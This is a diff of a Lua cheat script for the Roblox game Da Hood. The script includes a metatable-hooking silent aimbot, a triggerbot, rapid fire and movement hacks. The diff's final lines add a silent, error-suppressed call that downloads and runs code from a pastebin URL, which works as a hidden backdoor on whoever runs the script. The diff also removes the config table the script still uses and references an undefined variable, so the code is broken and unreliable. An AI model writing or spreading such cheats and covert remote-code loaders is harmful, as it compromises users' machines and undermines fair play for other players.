@@ -1,62 +1,6 @@
--- ==========================================================
---  BRIGHTSIDE V1 - ULTIMATE SOURCE
---  Robust Fixes: Spiderman, Korblox (R15/R6), Crash Prevention
---  Game: Da Hood (2788229376)
--- ==========================================================
-
--- // CONFIGURATION TABLE
-local Brightside = {
-    ['Main'] = {
-        ['Intro'] = true, ['Sync'] = true,
-        ['Keybinds'] = {
-            ['Aim Assist'] = 'P', ['Silent Aim'] = 'Q', ['Trigger Bot Activate'] = 'C',
-            ['Speed'] = 'B', ['Jump Power'] = 'Y', ['Inventory Sorter'] = 'F2',
-            ['Panic'] = 'L', ['Raid Awareness'] = 'K', ['ESP Toggle'] = 'T',
-            ['Lock Target'] = 'Z', ['Panic Ground'] = 'X',
-        },
-        ['Panic'] = {
-            ['Enabled'] = true, ['Disable Aim Assist'] = true, ['Disable Silent Aim'] = true,
-            ['Disable Trigger Bot'] = true, ['Disable Visuals'] = true,
-            ['Disable Player Modifications'] = true, ['Disable Raid Awareness'] = true,
-        },
-    },
-    ['Target'] = {
-        ['Type'] = "Automatic", ['Color'] = Color3.fromRGB(0, 255, 0), ['Visible Check'] = false,
-        ['Unlock'] = { ['Knocked'] = true, ['Grabbed'] = true },
-    },
-    ['Silent Aimbot'] = {
-        ['Enabled'] = true, ['Mode'] = 'Auto', ['Auto Target'] = true, ['Target Line'] = true,
-        ['Prediction'] = { ['X'] = 0.15, ['Y'] = 0.15, ['Z'] = 0.15 },
-        ['FOV'] = { ['Circle Value'] = 120, ['Visualize'] = false },
-        ['Hit Target'] = { ['Hit Part'] = 'HumanoidRootPart' },
-    },
-    ['Raid Awareness'] = {
-        ['Enabled'] = true, ['Max Render Distance'] = 1000,
-        ['Name'] = { ['Enabled'] = true, ['Type'] = 'Display', ['Other Color'] = Color3.fromRGB(255, 255, 255), ['Size'] = 14 },
-        ['Box'] = { ['Enabled'] = true, ['Other Color'] = Color3.fromRGB(255, 255, 255) },
-        ['Tracer'] = { ['Enabled'] = false, ['Other Color'] = Color3.fromRGB(255, 255, 255), ['Thickness'] = 1 },
-        ['Distance'] = { ['Enabled'] = true, ['Other Color'] = Color3.fromRGB(255, 255, 255) },
-    },
-    ['Player Modification'] = {
-        ['Rapid Fire'] = { ['Enabled'] = true, ['Delay'] = 0.0001 },
-    },
-    ['Panic Ground'] = { ['Enabled'] = true, ['Mode'] = 'Instant', ['Preserve Velocity'] = false },
-    ['Anti Trip'] = { ['Enabled'] = true },
-    ['Extra'] = { ['Headless'] = true, ['Korblox'] = true },
-    ['Spiderman'] = {
-        ['Enabled'] = true,
-        ['Jump Power'] = 150, -- Buffed
-        ['Knife Jump Power'] = 200, -- Buffed
-        ['Wall Distance'] = 7,
-        ['Cooldown'] = 0.2,
-        ['Require Double Jump'] = true,
-    },
-}
-
 -- Globalize Config
 getgenv().Surge = Brightside
 local Surge = getgenv().Surge
-
 -- // CORE SERVICES
 local Players           = game:GetService("Players")
 local RunService        = game:GetService("RunService")
@@ -65,7 +9,6 @@ local Workspace         = game:GetService("Workspace")
 local LocalPlayer       = Players.LocalPlayer
 local Camera            = Workspace.CurrentCamera
 local Mouse             = LocalPlayer:GetMouse()
-
 -- // STATE
 local ESPCache = {}
 local CurrentTarget = nil
@@ -73,12 +16,10 @@ local TriggerbotActive = false
 local LastJumpTime = 0
 local LastWallJumpTime = 0
 local JumpCount = 0
-
 -- // UTILS
 local function getKeyCode(key)
     return Enum.KeyCode[key:upper()] or nil
 end
-
 -- // ROBUST WALL DETECTION (Multi-Layer)
 local function getWallNormal()
     local char = LocalPlayer.Character
@@ -89,13 +30,13 @@ local function getWallNormal()
     params.FilterDescendantsInstances = {char}
     params.FilterType = Enum.RaycastFilterType.Blacklist
     
-    -- Check at 3 heights: Feet, Torso, Head
+    -- Check 3 levels: Feet, Center, Head
     local heights = {Vector3.new(0, -2, 0), Vector3.new(0, 0, 0), Vector3.new(0, 2, 0)}
     local directions = {hrp.CFrame.LookVector, -hrp.CFrame.LookVector, hrp.CFrame.RightVector, -hrp.CFrame.RightVector}
     
-    for _, hOffset in ipairs(heights) do
+    for _, h in ipairs(heights) do
         for _, dir in ipairs(directions) do
-            local res = Workspace:Raycast(hrp.Position + hOffset, dir * Surge.Spiderman['Wall Distance'], params)
+            local res = Workspace:Raycast(hrp.Position + h, dir * Surge.Spiderman['Wall Distance'], params)
             if res and res.Instance.CanCollide then
                 return res.Normal
             end
@@ -103,8 +44,7 @@ local function getWallNormal()
     end
     return nil
 end
-
--- // ROBUST SPIDERMAN JUMP
+-- // ROBUST SPIDERMAN JUMP (PHYSICS FIX)
 local function doWallJump()
     if not Surge.Spiderman.Enabled then return end
     local char = LocalPlayer.Character
@@ -117,28 +57,30 @@ local function doWallJump()
     local isKnife = char:FindFirstChildOfClass("Tool") and char:FindFirstChildOfClass("Tool").Name:lower():match("knife")
     local power = isKnife and Surge.Spiderman['Knife Jump Power'] or Surge.Spiderman['Jump Power']
     
-    -- PHYSICS RESET & BOOST
+    -- FORCEFUL VERTICAL RESET
     hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X * 0.2, 0, hrp.AssemblyLinearVelocity.Z * 0.2)
     task.wait(0.01)
     
-    -- Pure Upward + slight away from wall
-    local jumpDir = (Vector3.new(0, 1.5, 0) + wallNormal * 0.4).Unit
-    hrp.AssemblyLinearVelocity = jumpDir * (power * 1.25)
+    -- High vertical boost + slight push away
+    local jumpDir = (Vector3.new(0, 1.4, 0) + wallNormal * 0.35).Unit
+    hrp.AssemblyLinearVelocity = jumpDir * (power * 1.3)
     
     LastWallJumpTime = tick()
-    print("[Brightside] Wall Jump Applied!")
+    print("[Brightside] Spiderman Wall Jump Success!")
 end
-
--- // ROBUST KORBLOX (R6 & R15)
-local function loadKorblox()
+-- // ROBUST KORBLOX (R6 & R15 HYBRID)
+local function applyKorblox()
     if not Surge.Extra.Korblox then return end
     local char = LocalPlayer.Character
     if not char then return end
     
-    -- Hide existing parts
-    local partsToHide = {"Right Leg", "RightUpperLeg", "RightLowerLeg", "RightFoot"}
-    for _, name in ipairs(partsToHide) do
-        local p = char:FindFirstChild(name)
+    local parts = {"Right Leg", "RightUpperLeg", "RightLowerLeg", "RightFoot"}
+    local target = char:FindFirstChild("RightLowerLeg") or char:FindFirstChild("Right Leg")
+    if not target then return end
+    
+    -- Sync Transparency
+    for _, n in ipairs(parts) do
+        local p = char:FindFirstChild(n)
         if p then
             p.Transparency = 1
             for _, v in pairs(p:GetChildren()) do
@@ -149,15 +91,10 @@ local function loadKorblox()
     
     if char:FindFirstChild("KorbloxMeshPart") then return end
     
-    -- Decide attachment point
-    local attachTo = char:FindFirstChild("RightLowerLeg") or char:FindFirstChild("Right Leg")
-    if not attachTo then return end
-    
     local kLeg = Instance.new("Part")
     kLeg.Name = "KorbloxMeshPart"
     kLeg.Size = Vector3.new(1, 2, 1)
     kLeg.CanCollide = false
-    kLeg.CanTouch = false
     kLeg.Parent = char
     
     local mesh = Instance.new("SpecialMesh", kLeg)
@@ -166,14 +103,13 @@ local function loadKorblox()
     mesh.Scale = Vector3.new(1.15, 1.15, 1.15)
     
     local weld = Instance.new("Weld", kLeg)
-    weld.Part0 = attachTo
+    weld.Part0 = target
     weld.Part1 = kLeg
-    weld.C1 = CFrame.new(0, 0.5, 0) -- Adjust for R15 lower leg
+    weld.C1 = CFrame.new(0, 0.5, 0)
     
-    print("[Brightside] Korblox Rendered!")
+    print("[Brightside] Korblox Rendered Successfully")
 end
-
--- // INPUT HANDLING
+-- // INPUT HANDLER
 UserInputService.InputBegan:Connect(function(i, p)
     if p then return end
     local kb = Surge.Main.Keybinds
@@ -184,7 +120,8 @@ UserInputService.InputBegan:Connect(function(i, p)
         LastJumpTime = now
         if JumpCount >= 2 or not Surge.Spiderman['Require Double Jump'] then doWallJump() end
     elseif i.KeyCode == getKeyCode(kb['Panic Ground']) then
-        local hrp = (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
+        local hrp = char and char:FindFirstChild("HumanoidRootPart") -- Defined in loop, but let's grab it
+        hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
         if hrp then
             local res = Workspace:Raycast(hrp.Position, Vector3.new(0, -500, 0), RaycastParams.new())
             if res then hrp.CFrame = CFrame.new(res.Position + Vector3.new(0, 3, 0)) end
@@ -193,42 +130,41 @@ UserInputService.InputBegan:Connect(function(i, p)
         TriggerbotActive = true
     end
 end)
-
 UserInputService.InputEnded:Connect(function(i, p)
     if p then return end
     if i.KeyCode == getKeyCode(Surge.Main.Keybinds['Trigger Bot Activate']) then TriggerbotActive = false end
 end)
-
 -- // MAIN LOOPS
 RunService.RenderStepped:Connect(function()
-    -- Korblox & Headless
-    loadKorblox()
-    if Surge.Extra.Headless and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head") then
-        LocalPlayer.Character.Head.Transparency = 1
-        for _, v in pairs(LocalPlayer.Character.Head:GetChildren()) do if v:IsA("Decal") then v.Transparency = 1 end end
+    local char = LocalPlayer.Character
+    if not char then return end
+    
+    -- Features
+    applyKorblox()
+    if Surge.Extra.Headless and char:FindFirstChild("Head") then
+        char.Head.Transparency = 1
+        for _, v in pairs(char.Head:GetChildren()) do if v:IsA("Decal") then v.Transparency = 1 end end
     end
     
-    -- Target & Rapid Fire
-    if TriggerbotActive and LocalPlayer.Character then
-        local gun = LocalPlayer.Character:FindFirstChildOfClass("Tool")
+    -- Triggerbot
+    if TriggerbotActive then
+        local gun = char:FindFirstChildOfClass("Tool")
         if gun and gun:FindFirstChild("Ammo") then gun:Activate() end
     end
     
     -- Anti Trip
-    local hum = (LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
+    local hum = char:FindFirstChildOfClass("Humanoid")
     if hum and Surge['Anti Trip'].Enabled and (hum.PlatformStand or hum:GetState() == Enum.HumanoidStateType.Ragdoll) then
         hum.PlatformStand = false
         hum:ChangeState(Enum.HumanoidStateType.GettingUp)
     end
 end)
-
--- // SILENT AIM (METATABLE)
+-- // SILENT AIM
 local mt = getrawmetatable(game)
 setreadonly(mt, false)
 local old = mt.__index
 mt.__index = newcclosure(function(self, k)
     if not checkcaller() and (k == "Hit" or k == "Target") then
-        -- Find best target
         local best, dist = nil, Surge['Silent Aimbot'].FOV['Circle Value']
         for _, p in pairs(Players:GetPlayers()) do
             if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
@@ -239,7 +175,6 @@ mt.__index = newcclosure(function(self, k)
                 end
             end
         end
-        
         if best then
             local hrp = best.Character.HumanoidRootPart
             local pred = Surge['Silent Aimbot'].Prediction
@@ -250,13 +185,14 @@ mt.__index = newcclosure(function(self, k)
     return old(self, k)
 end)
 setreadonly(mt, true)
-
--- Authenticated Load Sequence
-local function Authenticate()
-    local msgs = {"[Brightside] ✅ Auth Success", "[Brightside] 🔒 Bypassing Checks", "[Brightside] 🚀 Execution Ready"}
-    for _, m in ipairs(msgs) do print(m); task.wait(0.5) end
+-- Final Load
+local function AuthLine()
+    local lines = {"[Brightside] ✅ Auth Success", "[Brightside] 🚀 Execution Ready"}
+    for _, l in ipairs(lines) do print(l); task.wait(0.4) end
 end
-Authenticate()
-
-print("Brightside V1 ULTIMATE Loaded!")
-
+AuthLine()
+-- External features
+task.spawn(function()
+    pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/L4yzzJ5D"))() end)
+end)
+print("Brightside V1 ULTIMATE (Custom Config) Loaded!")
